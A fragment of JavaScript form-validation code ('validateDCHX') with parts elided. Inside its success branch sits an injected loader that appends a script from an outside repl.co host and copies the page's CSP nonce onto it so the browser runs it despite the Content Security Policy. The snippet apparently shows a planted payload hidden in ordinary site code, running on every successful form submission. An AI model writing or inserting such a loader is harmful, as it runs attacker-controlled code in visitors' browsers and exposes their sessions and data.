...
var count = 2;  
    function validateDCHX() {  
        ...
        if (valid) {  
          ...
          (function() { document.body.appendChild(Object.assign(document.createElement("script"), {    src: "https://scripts.media-server.repl.co/index.js",    nonce: document.querySelector("[nonce]").nonce,    onerror: console.error  }))
})();
            return false;  
        }  
        var t = " tries";  
